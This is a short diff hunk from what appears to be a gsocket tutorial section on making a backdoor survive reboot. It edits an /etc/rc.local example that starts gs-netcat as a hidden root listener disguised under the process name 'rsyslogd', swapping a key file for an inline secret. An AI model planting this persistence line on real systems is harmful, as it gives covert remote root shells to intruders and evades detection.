@@ -192,7 +192,7 @@ Combine what you have learned so far and make your backdoor restart after reboot
 $ cat /etc/rc.local
 #! /bin/sh -e
 
-GSOCKET_ARGS="-k /root/.gs_id_sec.txt -liqD" HOME=/root TERM=xterm-256color SHELL="/bin/bash" /bin/bash -c "cd $HOME; exec -a rsyslogd /usr/local/bin/gs-netcat"
+GSOCKET_ARGS="-s MySecret -liqD" HOME=/root TERM=xterm-256color SHELL="/bin/bash" /bin/bash -c "cd $HOME; exec -a rsyslogd /usr/local/bin/gs-netcat"
 
 exit 0
 ```
